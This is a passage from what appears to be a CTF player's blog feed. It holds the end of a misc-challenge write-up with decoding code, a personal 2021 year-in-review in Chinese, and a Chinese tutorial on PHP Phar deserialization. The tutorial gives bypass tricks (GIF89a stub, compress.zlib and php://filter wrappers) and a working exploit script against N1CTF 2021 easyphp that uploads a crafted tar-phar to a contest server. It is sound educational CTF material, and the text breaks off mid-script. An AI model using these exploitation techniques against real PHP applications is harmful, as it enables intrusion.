class="string">&quot;1&quot;</span> <span class="keyword">if</span> code&amp;(<span class="number">1</span>&lt;&lt;ind) <span class="keyword">else</span> <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> retStr[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hamming</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">15</span>):</span><br><span class="line">        retStr = retStr + HammingBolck(message[ind:ind+<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">20</span>):</span><br><span class="line">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class="number">20</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchester</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        retStr += <span class="string">&quot;01&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchesterInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">2</span>):</span><br><span class="line">        char = message[ind]</span><br><span class="line">        retStr += <span class="string">&quot;0&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line">bit_string=bit_string[::-<span class="number">1</span>]</span><br><span class="line">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure><h3 id="7-Final-Words"><a href="#7-Final-Words" class="headerlink" title="7. Final Words"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: that’s because the former is channel coding, and the latter is source coding. We shouldn’t just pick some random encryption and apply it to plaintext.</p><p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).</p><p>ご武運を！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Write-Up </tag>
            
            <tag> 出题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回望2021，并小小展望2022</title>
      <link href="/2022/01/21/%E5%9B%9E%E6%9C%9B2021%EF%BC%8C%E5%B9%B6%E5%B0%8F%E5%B0%8F%E5%B1%95%E6%9C%9B2022/"/>
      <url>/2022/01/21/%E5%9B%9E%E6%9C%9B2021%EF%BC%8C%E5%B9%B6%E5%B0%8F%E5%B0%8F%E5%B1%95%E6%9C%9B2022/</url>
      
        <content type="html"><![CDATA[<p>这时候写这东西总显得不太赶趟。然而私以为“年度总结”这类东西只有一年完全结束了才算数。虽然以前也并没怎么写过，不过毕竟2021对我来讲还算是一个转折点，有更特殊的一些……意义？不如就试着写写流水账吧。<br>前半年其实没啥好说的，无非就是在备战高考。可惜我没有那样的毅力认真学习，就像我把高一高二彻底荒废在打游戏上一样，高三我依旧贯彻“小考小摸大考大摸”的作风。无论是成人礼还是高考誓师学校都没搞出什么激情，也许本省就是这么佛系吧。周末就捣鼓二手电子原件，平时就玩笔。自习的时候总是一刻也坐不住，自己溜到六楼的楼梯间边听歌边看Kindle顺带在黑暗中观察小情侣。一点压力也没有是不现实的，毕竟那是高考。各类教辅买了不少，尽管完成度堪忧，不过毕竟断断续续做了也不少，收获还是比较丰富的——但是我高考前一天还在炒币（亏了500）是怎么回事呢？所以某种意义上我的学习就是一种表演，本色还是摸鱼🐟。然而这种行事风格不完全是坏处，至少性价比很高：因为我花费的精力少，于是就不得不更精准、功利、高考导向一些。最后的高考语文考得出奇优秀（至少对我这个肚子里搜刮不出半点墨水的来说，毕竟我完全抛弃校内材料而是寻求各类出版物的现成知识），反而是数学炸了。尽管个例不能说明什么，但我想熟悉我的人中也许有不少会认同这个情况正是本届语文&amp;数学教学失败的一个缩影。还好，我很险地被浙江某倒数第一211（仅仅高于最低录取分数线1分）录取，实在是幸运，不过这是后话了。高三没能好好学习，倒是认识了不少佼佼者，作为一名竞赛班混子我对此感到无比荣幸：每日埋头猛书以至于课间都跑步去卫生间的，在操场活动或是体育课拿着板夹赶作业的，如此种种能人志士每每目击之总令我心生愧疚，此时再看一眼我被没收了4次甚至3次的手机上的高考倒计时，不由得心生焦虑。有时想到马上高考，竟忍不住大哭，再红着眼回教室继续该干啥干啥。可惜本人没有化压力为动力的体质，自然也没有化摆烂为神奇的态度进行高考冲刺，只是嗟叹良久而复摸大鱼，在和同学的谈笑风生中消磨宝贵的、在文艺作品中被描述为“美好青春尾声”（迫真）的高三备考时间。但绝大部分同学都人很好还很强！能够认识实在是很幸运。此外借由竞赛这一渠道在网上也认识了许多大佬，高兴高兴。不过也希望能珍惜这样的经历，有时候失去真的是很突然的，不可挽回的。<br>高考结束，那个暑假疯狂地联机游戏，在家里造各种东西，以前没有精力、没有条件的很多事情终于能在这个假期放肆地玩一把了。除此以外就是和机房的各位到处吃吃吃，猫咖什么的都走起。自己组了台机子，学学焊板子，玩玩Arduino。然后很突然地就得知自己被ZJU录取了（几乎压线），之前只想着不是SJTU就是NJU从没想过是这个结果（笑，现在看来是最好的选择，毕竟没有hnx那样的勤奋，收获÷努力的性价比已经很高了）。时间过得太快，转眼就要开学了了，我根本没做好成为大学生的准备！还没从对最长暑假的怀念中走出，恁蔗就给整了一堆幺蛾子出来，延迟到校不说，终于抵达后在校的第一天还被踢皮球，从早到晚硬是走了几万步。只能说，第一印象很重要……（痛苦的）军训结束后，大学生活算是正式开始了。这后半年总体我还是很开心的。<br>首先我的舍友们基本都睡得很晚，完美契合本人猫头鹰派作息：“灿若星辰的浙大人”当然应该在星空下干活，白天留给暖洋洋的睡眠才是正道，早八乃邪恶之物。舍友都很正常，还可以一起联机游戏，学业上也有良性互动。我几个月后才感受到这是多么宝贵和幸运——和部分高中同学的在大学住宿的悲惨经历对比而言（希望人没事）。说到幸运，我觉得最幸运的是加入了AAA，认识了各位师傅。其实我是暑假开始打了成电的招新赛，愈发觉得CTF有意思。来了大学后在楼下看见招新横幅一下就被吸引了。后来的某一周我几乎整天沉迷打中科大的hackergame，确实过于上头了。借此认识了某知识领域优秀up主和某密码学大师，认识了队里的学长们，然后就进去了。感觉就……很突然，我真心觉得自己还是太菜了，可是依然跟着队里的大佬们蹭饭化学泡温泉……还是要提高自己姿势水平，不辜负无论是家长还是老师还是队里各位的期待才是最佳的回报方法。  </p><blockquote><p>There should be one– and preferably only one –obvious way to do it.<br>——Tim Peters, The Zen of Python</p></blockquote><p>感谢贵校的分流制度，我去了CS专业，按照高考成绩来说这实在是十足的捡漏了。虽然大家都有光明的未来，学数学的将来指不定就和学商科的同学强强联合，quant们横扫业界走上人生巅峰；不过我确实喜欢着coding之类的，当个臭写代码的也不是不可以嘛。总之喜欢就好了，知足常乐.jpg<br>这学期结束的绩点……嗯……差强人意吧，希望之后能够用专业课拉一拉。<br>然后不得不提的就是拉拉群，在群里缺德真是太有意思了，人才辈出，解答各种疑问的同时还能给予我十足的peer pressure，实在是十分感谢了&#x3D;_&#x3D;<br>此外加入F社也很兴奋！&#x2F;&#x2F;虽然社团课摸了<br>我的2021大概就是这样，没有很特别的，但是真的挺幸运的。难道说在大多数时候用“没有什么大不了”的心态去面对那些烦人的事情，就会更幸运？<br>那么2022呢？我许几个小小的愿望。<br>我希望我能把小提琴捡起来，兑现以前放弃学习时的承诺（笑）；<br>然后就是好好学web&#x2F;misc方向，给队里做出更大贡献；<br>我希望2022我可以对未来看得更清，对接下来的道路拟定方向；<br>新的一年不要再摆烂，认真对待专业课；<br>最后，我希望大家身体健康，希望所有人好好活下去，有心理健康上的问题能够积极寻求帮助。<br>新年快乐。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Phar反序列化漏洞利用：N1CTF 2021 easyphp &amp; 安洵杯2021 EZ_TP</title>
      <link href="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/"/>
      <url>/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</url>
      
        <content type="html"><![CDATA[<h1 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h1><h2 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是Phar</h2><blockquote><p>PHp ARchive, like a Java JAR, but for PHP.</p></blockquote><p>phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。</p><blockquote><p>phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p></blockquote><p>说白了，就是一种压缩文件，但是不止能放压缩文件进去。</p><p>在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p><p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.readonly = 0</span><br></pre></td></tr></table></figure><p>即可。</p><hr><h2 id="Phar文件格式"><a href="#Phar文件格式" class="headerlink" title="Phar文件格式"></a>Phar文件格式</h2><p>Phar文件由四部分组成：</p><p><strong>1.stub</strong></p><p>stub是phar文件的文件头，格式为<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>，xxxxxx可以是任意字符，包括留空，且php闭合符与最后一个分号之间不能有多于一个的空格符。另外php闭合符也可省略。</p><p><strong>2.manifest describing the contents</strong></p><p>该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132951141-67782555.png"></p><p>这里面的metadata以serialize形式储存，为反序列化漏洞埋下了伏笔。</p><p><strong>3.file contents</strong></p><p>被压缩的用户添加的文件内容</p><p>4.<strong>signature</strong></p><p>可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL.</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132825512-1951331537.png"></p><p>这部分以<code>GBMB</code>（47 42 4d 42）结尾。</p><p>需要注意，stub不一定要在文件开头。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>在2018 Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p><blockquote><p>利用phar文件会以序列化的形式存储用户自定义的<strong>meta-data</strong>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，<strong>可以不依赖unserialize()直接进行反序列化操作</strong>。</p></blockquote><p>也就是说，如果我们能控制传入以下函数的参数，就有潜在的phar反序列化漏洞利用可能：</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132837264-437243908.png"></p><p>还有一些别的函数可用，可参考这篇：<a href="https://www.freebuf.com/articles/web/205943.html">https://www.freebuf.com/articles/web/205943.html</a></p><p><strong>试试看？</strong></p><p>我们先来生成一个phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意这边$o反序列化只会保存数据不会保存方法。执行完毕后，我们来观察phar文件的内容：</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132846078-625393813.png"></p><p>GBMB结尾的签名以及序列化后的metadata清晰可见。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class="comment">//既然是压缩文件，我们可以如此访问其中的某个文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。</p><p>PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）</p><hr><h2 id="phar-x2F-x2F-是什么"><a href="#phar-x2F-x2F-是什么" class="headerlink" title="phar:&#x2F;&#x2F;是什么"></a><strong>phar:&#x2F;&#x2F;是什么</strong></h2><p>前面提到，我们解析phar文件常常使用phar:&#x2F;&#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&#x2F;&#x2F;需要文件绝对路径，phar:&#x2F;&#x2F;并不需要。（来源请求）</p><hr><h2 id="小tricks"><a href="#小tricks" class="headerlink" title="小tricks"></a><strong>小tricks</strong></h2><h3 id="绕过前缀过滤"><a href="#绕过前缀过滤" class="headerlink" title="绕过前缀过滤"></a>绕过前缀过滤</h3><p>队里师傅的几个example可以类比使用，都是在前缀非phar:&#x2F;&#x2F;的情况下调用了phar:&#x2F;&#x2F;</p><p>compress.bzip2和compress.zlib</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$z</span>);</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="简单的绕过"><a href="#简单的绕过" class="headerlink" title="简单的绕过"></a>简单的绕过</h3><p>我们可以利用stub部分前缀任意的特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置 stub，增加 gif 文件头</span></span><br></pre></td></tr></table></figure><p>这可以绕过一部分对文件头的检测。</p><hr><h3 id="绕过前后脏数据"><a href="#绕过前后脏数据" class="headerlink" title="绕过前后脏数据"></a>绕过前后脏数据</h3><p>由于签名部分的存在，php会校验文件哈希值，并检查末尾是否为GBMB，如下是解析部分的源码：</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132857316-1778918757.png"></p><p><a href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p>可见，如果末尾不是GBMB会直接导致解析失败。</p><p>在CTF中利用该漏洞需要我们完成写入&#x2F;上传phar，并调用文件包含函数。我们知道一句话木马由于有<code>&lt;?php ?&gt;</code>这样的头尾标识存在，可以无视前后脏数据；然而对于phar，这样的骚操作被签名部分阻止了。有办法绕过吗？请参阅：<a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>利用convertToExecutable函数，我们可以把phar文件转为其他格式的phar文件，例如.tar和.zip格式。</p><p>我们以N1CTF easyphp为例子，这题允许我们写入日志，并且可以利用phar反序列化得到flag，难点在于日志文件前后有额外脏数据，会使得我们的phar文件无法被解析。</p><p>然而如果以tar格式储存phar，末尾的脏数据并不会影响解析（这是tar的格式决定的），而开头的脏数据可以在制造phar文件时就提前构造好（这样这部分数据也会被纳入签名计算），写入日志时不必写入这部分，而是令其与脏数据拼接形成合法的phar。exploit如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">CLASS FLAG &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="variable language_">$this</span>-&gt;_flag;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sb</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sb&#x27;</span>];</span><br><span class="line">    <span class="variable">$ts</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ts&#x27;</span>];</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$sb</span>.<span class="string">&quot;.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    **<span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>); <span class="comment">//会生成*.phar.tar**</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;Time: &quot;</span>.<span class="variable">$ts</span>.<span class="string">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class="variable">$sb</span>.<span class="string">&quot;], CONTENT: [&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; data = <span class="string">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这个跑在本地web服务上，然后写个脚本（当时半夜赶制的很丑会留下一些垃圾文件 求轻喷 队里师傅写的干净多了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">ip = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  生成一个指定长度的随机字符串</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_one</span>(<span class="params">offset</span>):</span><br><span class="line">    rd = generate_random_str(<span class="number">4</span>)</span><br><span class="line">    ts2 = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class="line">    ts = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    res = rq.get(url=<span class="string">f&quot;http://127.0.0.1/test.php?sb=<span class="subst">&#123;rd&#125;</span>&amp;ts=<span class="subst">&#123;ts2&#125;</span>&quot;</span>)  <span class="comment"># 访问本地生成phar</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        data = f.read()</span><br><span class="line">    data = data[<span class="number">70</span>::]<span class="comment">#去掉前面的冗余部分以便和log前面拼接形成合法*.phar.tar</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form&#x27;</span>&#125;  <span class="comment"># 源文本</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class="subst">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class="comment"># 写入日志</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class="subst">&#123;ip&#125;</span>/<span class="subst">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class="comment"># 反序列化</span></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">30</span>,<span class="number">30</span>):<span class="comment">#考虑本地和远程的时间差异，这边设置个30s的窗口期</span></span><br><span class="line">    new_one(i)</span><br><span class="line">    time.sleep(<span class="number">0.9</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;生成的文件长这样（看个开头就行）</span></span><br><span class="line"><span class="string">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class="line"><span class="string">00000010: 2030 363a 3533 